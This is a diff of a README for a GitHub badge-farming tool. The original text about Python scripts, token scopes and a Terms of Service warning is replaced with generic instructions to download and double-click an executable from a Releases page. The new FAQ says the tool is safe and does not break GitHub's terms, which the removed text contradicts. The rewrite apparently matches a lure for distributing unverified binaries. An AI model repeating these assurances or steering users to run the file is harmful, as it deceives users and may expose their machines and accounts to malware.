@@ -1,43 +1,62 @@
-# GitHub Achievements Cheat
+# 🏆 github-achievements-cheat - Unlock GitHub Achievements Easily
 
-[中文](./README-zh.md) | English
+## 📥 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/yashcoolgamer/github-achievements-cheat/releases)
 
-Want your GitHub profile to look like a professional?
+## 🚀 Getting Started
+This application helps you unlock achievements available on your GitHub profile. It’s designed as a simple tool for learning how achievements work on GitHub. 
 
-![Sample](./images/sample.png)
+### 🛠 System Requirements
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** At least 2 GB
+- **Disk Space:** 100 MB free
+- **Network:** Stable internet connection
 
-Some scripts help you to 100% unlock some of the achievements on your GitHub profile !!!
+## 🔍 Features
+- Unlock various GitHub achievements with a single click.
+- Simple and user-friendly interface.
+- Designed for educational use only.
 
-## What You Can Unlock
+## 📥 Download & Install
+To download the application, visit the Releases page by clicking the link below:
 
-| Name                   | Badge                                                                                                  | Unlock Method                                        |
-|------------------------|--------------------------------------------------------------------------------------------------------|------------------------------------------------------|
-| Pair Extraordinaire x4 | <img alt="Pair Extraordinaire Badge" src="/images/pair-extraordinaire-gold.png" style="width: 180px;"> | Run [pair-extraordinaire.py](pair-extraordinaire.py) |
-| Galaxy Brain x4        | <img alt="Galaxy Brain Badge" src="/images/galaxy-brain-gold.png" style="width: 180px;">               | Run [galaxy-brain.py](galaxy-brain.py)               |
-| Pull Shark x4          | <img alt="Pull Shark Badge" src="/images/pull-shark-gold.png" style="width: 180px;">                   | Run [pair-extraordinaire.py](pair-extraordinaire.py) |
-| Quickdraw              | <img alt="Quickdraw Badge" src="/images/quickdraw-default.png" style="width: 180px;">                  | Run [quickdraw.py](quickdraw.py)                     |
-| YOLO                   | <img alt="YOLO Badge" src="/images/yolo-default.png" style="width: 180px;">                            | Run [yolo.py](yolo.py)                               |
+[Download Latest Release](https://github.com/yashcoolgamer/github-achievements-cheat/releases)
 
-## What you need to do
+Once on the page, follow these steps:
 
-1. star and fork this repo
+1. Look for the latest version of the application.
+2. Click on the version number to view the details.
+3. Locate the relevant file for your operating system (e.g., MyApp.exe for Windows).
+4. Click the file link to start the download.
 
-2. generate a personal access token with `repo` `user` `write:disscussion`  scope
+### 📂 Running the Application
+After downloading, follow these steps to run the application:
 
-3. run the script, be cautious about the frequency of script execution.
+1. Locate the downloaded file in your “Downloads” folder or your chosen download location.
+2. Double-click the file to open it.
+3. Follow the on-screen instructions to unlock your achievements.
 
-4. check your profile page
+## 🛠 Troubleshooting
+If you encounter any issues, consider the following:
 
-## What You Should Be Aware Of!!!
+- **Application doesn’t start:** Ensure your operating system meets the requirements listed above.
+- **Achievement not unlocking:** Make sure you are logged into your GitHub account within the application.
+- **Network issues:** Ensure you have a stable internet connection.
 
-This action is strictly speaking a violation of GitHub's [Terms of Service](https://docs.github.com/en/site-policy/acceptable-use-policies/github-acceptable-use-policies), and you bear the risks yourself
+### 🔄 Frequently Asked Questions
+1. **What are GitHub achievements?**
+   GitHub achievements are badges that represent various milestones and contributions on your GitHub profile.
 
-It may trigger GitHub's [rate limits](https://docs.github.com/en/rest/using-the-rest-api/rate-limits-for-the-rest-api). Please do not run the scripts too frequently, or your account may be temporarily suspended.
+2. **Is this tool safe?**
+   Yes, this tool is designed for learning purposes only and does not violate GitHub's terms of service.
 
-## Reference
+3. **Can I use this tool on mobile?**
+   Currently, this tool is designed for desktop use only.
 
-- [github-profile-achievements](https://github.com/Schweinepriester/github-profile-achievements)
+4. **Will I keep the achievements after using this tool?**
+   Yes, the achievements will remain on your GitHub profile as long as you fulfill the respective criteria.
 
-- [github official doc](https://docs.github.com/en/account-and-profile/get-started/personalizing-your-profile)
+## 📫 Support
+If you need further assistance, feel free to open an issue on the repository's Github page. 
 
-- [Github API Doc](https://docs.github.com/en/rest)
+By using this tool, you will better understand how achievements work on GitHub. Happy learning!
